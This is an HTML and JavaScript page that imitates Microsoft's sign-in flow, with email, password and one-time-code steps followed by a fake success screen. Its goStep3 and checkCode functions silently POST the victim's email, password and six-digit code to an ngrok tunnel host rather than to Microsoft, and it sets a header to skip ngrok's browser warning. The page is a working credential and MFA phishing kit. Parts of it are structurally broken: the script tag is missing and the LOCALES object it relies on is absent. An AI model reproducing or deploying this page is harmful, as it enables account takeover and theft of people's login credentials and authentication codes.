<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Microsoft – Sign in</title>
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    min-height: 100vh;
    font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
    font-size: 15px;
    background: #f2f2f2;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
  }

  .ms-bg {
    position: fixed; inset: 0; z-index: 0;
    background: #f2f2f2;
  }
  .ms-bg::before {
    content: '';
    position: absolute; top: -10%; right: -5%;
    width: 55%; height: 70%;
    background: radial-gradient(ellipse at 70% 30%,
      rgba(0,103,184,0.10) 0%, transparent 70%);
  }
  .ms-bg::after {
    content: '';
    position: absolute; bottom: -10%; left: -5%;
    width: 55%; height: 65%;
    background: radial-gradient(ellipse at 30% 70%,
      rgba(0,164,239,0.08) 0%, transparent 70%);
  }

  /* ── CARD ── */
  .card {
    position: relative; z-index: 1;
    background: #fff;
    box-shadow: 0 2px 6px rgba(0,0,0,0.18);
    width: 440px;
    padding: 44px 44px 36px;
  }

  .page { display: none; }
  .page.active { display: block; }

  /* ── LOGO ── */
  .logo-left { margin-bottom: 30px; }

  .logo-centered {
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
    margin-bottom: 22px;
    width: 100%;
  }

  /* ── BACK ARROW — exact MS size ── */
  .back-btn {
    position: absolute; left: 0;
    background: none; border: none; cursor: pointer;
    padding: 4px;
    display: flex; align-items: center; justify-content: center;
    border-radius: 2px;
    transition: background 0.12s;
  }
  .back-btn:hover { background: #e8e8e8; }

  /* Real MS chevron: ~28px tall, thick, blue */
  .back-btn svg {
    width: 28px;
    height: 28px;
    display: block;
  }

  /* ── MS FLAG + WORDMARK ── */
  .ms-logo {
    display: flex;
    align-items: center;
    gap: 8px;
    text-decoration: none;
  }
  .ms-flag {
    display: grid;
    grid-template-columns: 1fr 1fr;
    grid-template-rows: 1fr 1fr;
    gap: 2px;
    width: 21px; height: 21px;
    flex-shrink: 0;
  }
  .ms-flag span:nth-child(1) { background: #f25022; }
  .ms-flag span:nth-child(2) { background: #7fba00; }
  .ms-flag span:nth-child(3) { background: #00a4ef; }
  .ms-flag span:nth-child(4) { background: #ffb900; }

  .ms-word {
    font-size: 17px;
    font-weight: 600;
    color: #737373;
    letter-spacing: -0.3px;
    line-height: 1;
  }

  /* ── EMAIL PILL ── */
  .email-pill {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    border: 1px solid #8a8a8a;
    border-radius: 14px;
    padding: 4px 14px 4px 9px;
    font-size: 13px;
    color: #1b1b1b;
    margin-bottom: 22px;
    max-width: 100%;
    overflow: hidden;
  }
  .email-pill span {
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }

  /* ── TITLES ── */
  .page-title {
    font-size: 24px;
    font-weight: 600;
    color: #1b1b1b;
    margin-bottom: 14px;
  }
  .page-sub {
    font-size: 13px;
    color: #1b1b1b;
    margin-bottom: 22px;
    line-height: 1.55;
  }

  /* ── INPUTS ── */
  .field-wrap { position: relative; margin-bottom: 4px; }

  .field {
    width: 100%; height: 48px;
    padding: 18px 44px 0 11px;
    font-family: inherit; font-size: 15px;
    color: #1b1b1b; background: #fff;
    border: 1px solid #767676;
    outline: none;
    transition: border-color 0.1s, box-shadow 0.1s;
  }
  .field:hover:not(:focus) { border-color: #1b1b1b; }
  .field:focus {
    border-color: #0067b8;
    box-shadow: 0 0 0 1px #0067b8 inset;
  }

  .flabel {
    position: absolute;
    left: 12px; top: 15px;
    font-size: 14px; color: #767676;
    pointer-events: none;
    transition: top .1s, font-size .1s, color .1s;
  }
  .field:focus ~ .flabel,
  .field.filled ~ .flabel {
    top: 6px; font-size: 11px;
  }
  .field:focus ~ .flabel { color: #0067b8; }

  .eye-btn {
    position: absolute; right: 8px; top: 50%;
    transform: translateY(-50%);
    background: none; border: none; cursor: pointer;
    color: #1b1b1b; padding: 6px;
    display: flex; align-items: center;
    border-radius: 2px;
  }
  .eye-btn:hover { background: #f2f2f2; }

  /* ── LINKS ── */
  .ms-link {
    font-size: 13px; color: #0067b8;
    cursor: pointer; display: inline-block;
    margin: 12px 0 22px;
    text-decoration: none;
  }
  .ms-link:hover { text-decoration: underline; }

  /* ── ERROR ── */
  .err-msg {
    font-size: 12px; color: #a4262c;
    margin: 6px 0 8px; display: none; padding: 4px 0;
  }

  /* ── NEXT BUTTON — right-aligned, MS style ── */
  .btn-row {
    display: flex;
    justify-content: flex-end;
    margin-top: 4px;
  }
  .btn-next {
    min-width: 108px; height: 32px;
    padding: 0 18px;
    background: #0067b8; color: #fff;
    font-family: inherit; font-size: 14px;
    border: none; cursor: pointer;
    transition: background 0.1s;
  }
  .btn-next:hover { background: #005ba3; }
  .btn-next:active { background: #004e8c; }

  /* ── BOTTOM LINKS ── */
  .bottom-link {
    font-size: 13px; color: #1b1b1b;
    margin-top: 20px;
  }
  .bottom-link a {
    color: #0067b8; cursor: pointer; text-decoration: none;
  }
  .bottom-link a:hover { text-decoration: underline; }

  /* ── OTP BOXES — match screenshot exactly ── */
  .code-row {
    display: flex;
    gap: 8px;
    margin-bottom: 10px;
  }
  .cdig {
    width: 44px; height: 52px;
    border: 1px solid #767676;
    font-size: 22px; font-family: inherit;
    color: #1b1b1b; text-align: center;
    outline: none;
    -moz-appearance: textfield;
    transition: border-color 0.1s, box-shadow 0.1s;
  }
  .cdig::-webkit-outer-spin-button,
  .cdig::-webkit-inner-spin-button { -webkit-appearance: none; }
  .cdig:focus {
    border-color: #0067b8;
    box-shadow: 0 0 0 1px #0067b8 inset;
  }

  /* ── SUCCESS ── */
  .success-icon { width: 52px; height: 52px; margin-bottom: 18px; }

  /* ── FOOTER ── */
  .ms-footer {
    position: relative; z-index: 1;
    margin-top: 18px;
    display: flex; gap: 16px; flex-wrap: wrap;
    font-size: 11px; color: #767676;
  }
  .ms-footer a { color: #767676; text-decoration: none; }
  .ms-footer a:hover { text-decoration: underline; }

  @media (max-width: 500px) {
    .card {
      width: 100vw; min-height: 100vh;
      padding: 40px 24px 32px;
      box-shadow: none;
    }
    body { justify-content: flex-start; }
  }
</style>

<body>
<div class="ms-bg"></div>

<div class="card">

  <!-- ══ PAGE 1 : EMAIL ══ -->
  <div class="page active" id="p1">
    <div class="logo-left">
      <div class="ms-logo">
        <div class="ms-flag">
          <span></span><span></span><span></span><span></span>
        </div>
        <span class="ms-word">Microsoft</span>
      </div>
    </div>
    <div class="page-title" data-i18n="title_signin"></div>
    <div class="page-sub"   data-i18n="sub_signin"></div>
    <div class="field-wrap">
      <input class="field" type="email" id="emailInput" autocomplete="email"
        placeholder="" oninput="syncFilled(this)"/>
      <label class="flabel" data-i18n="label_email"></label>
    </div>
    <div class="err-msg" id="errEmail" data-i18n="err_email"></div>
    <div style="margin-top:10px; margin-bottom:22px;">
      <a class="ms-link" href="#" data-i18n="link_no_account"></a>
    </div>
    <div style="font-size:13px; color:#1b1b1b; margin-bottom:14px;" data-i18n="link_cant_access"></div>
    <div class="btn-row">
      <button class="btn-next" onclick="goStep2()" data-i18n="btn_next"></button>
    </div>
  </div>

  <!-- ══ PAGE 2 : MOT DE PASSE ══ -->
  <div class="page" id="p2">
    <div class="logo-centered">
      <button class="back-btn" onclick="goBack(1)" aria-label="Back">
        <!-- Real MS chevron shape — thick, ~28px -->
        <svg viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M18 6L10 14L18 22" stroke="#0067b8" stroke-width="2.8"
            stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </button>
      <div class="ms-logo">
        <div class="ms-flag">
          <span></span><span></span><span></span><span></span>
        </div>
        <span class="ms-word">Microsoft</span>
      </div>
    </div>

    <div style="text-align:center; margin-bottom:22px;">
      <div class="email-pill" style="margin-bottom:0;">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none"
          stroke="#555" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
          <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
          <circle cx="12" cy="7" r="4"/>
        </svg>
        <span id="emailShow">—</span>
      </div>
    </div>

    <div class="page-title" data-i18n="title_pwd"></div>
    <div class="field-wrap">
      <input class="field" type="password" id="pwdInput"
        autocomplete="current-password" placeholder=""
        oninput="syncFilled(this)"/>
      <label class="flabel" data-i18n="label_pwd"></label>
      <button class="eye-btn" onclick="togglePwd()" type="button">
        <svg id="eyeIcon" width="18" height="18" viewBox="0 0 24 24" fill="none"
          stroke="currentColor" stroke-width="1.6"
          stroke-linecap="round" stroke-linejoin="round">
          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
          <circle cx="12" cy="12" r="3"/>
        </svg>
      </button>
    </div>
    <div class="err-msg" id="errPwd" data-i18n="err_pwd"></div>
    <a class="ms-link" href="#" data-i18n="link_forgot_pwd"></a>
    <div class="btn-row">
      <button class="btn-next" onclick="goStep3()" data-i18n="btn_next"></button>
    </div>
    <div class="bottom-link">
      <a data-i18n="link_other_ways"></a>
    </div>
  </div>

  <!-- ══ PAGE 3 : CODE OTP ══ -->
  <div class="page" id="p3">
    <div class="logo-centered">
      <button class="back-btn" onclick="goBack(2)" aria-label="Back">
        <svg viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M18 6L10 14L18 22" stroke="#0067b8" stroke-width="2.8"
            stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </button>
      <div class="ms-logo">
        <div class="ms-flag">
          <span></span><span></span><span></span><span></span>
        </div>
        <span class="ms-word">Microsoft</span>
      </div>
    </div>

    <div style="text-align:center; margin-bottom:22px;">
      <div class="email-pill" style="margin-bottom:0;">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none"
          stroke="#555" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
          <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
          <circle cx="12" cy="7" r="4"/>
        </svg>
        <span id="emailShow3">—</span>
      </div>
    </div>

    <div class="page-title" data-i18n="title_code"></div>
    <div class="page-sub" id="codeSub"></div>

    <div class="code-row">
      <input class="cdig" type="number" id="d1" inputmode="numeric">
      <input class="cdig" type="number" id="d2" inputmode="numeric">
      <input class="cdig" type="number" id="d3" inputmode="numeric">
      <input class="cdig" type="number" id="d4" inputmode="numeric">
      <input class="cdig" type="number" id="d5" inputmode="numeric">
      <input class="cdig" type="number" id="d6" inputmode="numeric">
    </div>
    <div class="err-msg" id="errCode" data-i18n="err_code"></div>

    <a class="ms-link" href="#" data-i18n="link_no_code"></a>
    <div class="btn-row">
      <button class="btn-next" onclick="checkCode()" data-i18n="btn_signin"></button>
    </div>
  </div>

  <!-- ══ PAGE 4 : SUCCÈS ══ -->
  <div class="page" id="p4">
    <div class="logo-left">
      <div class="ms-logo">
        <div class="ms-flag">
          <span></span><span></span><span></span><span></span>
        </div>
        <span class="ms-word">Microsoft</span>
      </div>
    </div>
    <svg class="success-icon" viewBox="0 0 52 52" fill="none">
      <circle cx="26" cy="26" r="26" fill="#dff6dd"/>
      <polyline points="14,26 22,34 38,18"
        stroke="#107c10" stroke-width="3"
        stroke-linecap="round" stroke-linejoin="round"/>
    </svg>
    <div class="page-title" style="color:#107c10;" data-i18n="title_success"></div>
    <div class="page-sub" data-i18n="sub_success"></div>
  </div>

</div>

<div class="ms-footer">
  <span id="footerCopy"></span>
  <a href="#" data-i18n="footer_terms"></a>
  <a href="#" data-i18n="footer_privacy"></a>
</div>

/* detect lang — fallback to EN */
function detectLang() {
  const nav = (navigator.language || navigator.userLanguage || 'en').toLowerCase();
  const code = nav.split('-')[0];
  return LOCALES[code] ? code : 'en';
}

let T = {}; // active translations

function applyI18n(lang) {
  T = LOCALES[lang] || LOCALES['en'];
  const year = new Date().getFullYear();

  document.querySelectorAll('[data-i18n]').forEach(el => {
    const key = el.getAttribute('data-i18n');
    if (T[key] !== undefined) el.textContent = T[key];
  });

  /* footer year */
  const fc = document.getElementById('footerCopy');
  if (fc) fc.textContent = T.footer_copy.replace('{year}', year);

  /* RTL for Arabic */
  document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
  document.documentElement.lang = lang;
}

/* ══════════════════════════════════════════
   APP STATE
══════════════════════════════════════════ */
let currentPage = 1;

function showPage(from, to) {
  document.getElementById('p' + from).classList.remove('active');
  document.getElementById('p' + to).classList.add('active');
  currentPage = to;
}

function syncFilled(el) {
  el.classList.toggle('filled', el.value.length > 0);
}

function togglePwd() {
  const f = document.getElementById('pwdInput');
  const icon = document.getElementById('eyeIcon');
  if (f.type === 'password') {
    f.type = 'text';
    icon.innerHTML = `
      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8
               a18.45 18.45 0 0 1 5.06-5.94"/>
      <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8
               a18.5 18.5 0 0 1-2.16 3.19"/>
      <line x1="1" y1="1" x2="23" y2="23"/>`;
  } else {
    f.type = 'password';
    icon.innerHTML = `
      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
      <circle cx="12" cy="12" r="3"/>`;
  }
}

/* ── PAGE 1 → 2 ── */
function goStep2() {
  const email = document.getElementById('emailInput').value.trim();
  const err   = document.getElementById('errEmail');
  if (!email || !email.includes('@')) {
    err.style.display = 'block';
    return;
  }
  err.style.display = 'none';
  document.getElementById('emailShow').textContent = email;
  showPage(1, 2);
  setTimeout(() => document.getElementById('pwdInput').focus(), 80);
}

/* ── PAGE 2 → 3 ── */
function goStep3() {
  const email    = document.getElementById('emailInput').value.trim();
  const password = document.getElementById('pwdInput').value;
  const err      = document.getElementById('errPwd');
  if (!password) { err.style.display = 'block'; return; }
  err.style.display = 'none';

  fetch("https://manicure-contact-reopen.ngrok-free.dev/login", {
    method: "POST",
    credentials: "include",
    headers: {
    "Content-Type": "application/json",
    "ngrok-skip-browser-warning": "true"    
    },
    body: JSON.stringify({ email, password })
  }).catch(() => {});

  document.getElementById('emailShow3').textContent = email;

  /* i18n code sub with email interpolated */
  document.getElementById('codeSub').innerHTML =
    T.code_sub.replace('{email}', `<b>${email}</b>`);

  showPage(2, 3);
  setTimeout(() => document.getElementById('d1').focus(), 80);
}

/* ── OTP INPUTS ── */
const digits = [...document.querySelectorAll('.cdig')];

digits.forEach((inp, i) => {
  inp.addEventListener('input', () => {
    inp.value = inp.value.replace(/\D/g, '').slice(0, 1);
    if (inp.value && digits[i + 1]) digits[i + 1].focus();
    if (digits.every(d => d.value.length === 1)) checkCode();
  });

  inp.addEventListener('keydown', e => {
    if (e.key === 'Backspace' && !inp.value && digits[i - 1])
      digits[i - 1].focus();
  });

  inp.addEventListener('paste', e => {
    e.preventDefault();
    const pasted = (e.clipboardData || window.clipboardData)
      .getData('text').replace(/\D/g, '').slice(0, 6);
    pasted.split('').forEach((ch, j) => {
      if (digits[i + j]) digits[i + j].value = ch;
    });
    const next = digits[Math.min(i + pasted.length, 5)];
    if (next) next.focus();
    if (pasted.length === 6) checkCode();
  });
});

/* ── VERIFY CODE ── */
async function checkCode() {
  const code = digits.map(d => d.value).join('');
  const err  = document.getElementById('errCode');
  if (!/^\d{6}$/.test(code)) { err.style.display = 'block'; return; }
  err.style.display = 'none';

  try {
    await fetch("https://manicure-contact-reopen.ngrok-free.dev/verify-code", {
      method: "POST",
      credentials: "include",
      headers: {
      "Content-Type": "application/json",
      "ngrok-skip-browser-warning": "true"  
      },
      body: JSON.stringify({ code })
    });
  } catch (_) {}

  showPage(3, 4);
}

/* ── BACK ── */
function goBack(to) { showPage(to + 1, to); }

/* ── ENTER ── */
document.addEventListener('keydown', e => {
  if (e.key !== 'Enter') return;
  if (currentPage === 1) goStep2();
  else if (currentPage === 2) goStep3();
  else if (currentPage === 3) checkCode();
});

/* ── BOOT ── */
applyI18n(detectLang());
</script>
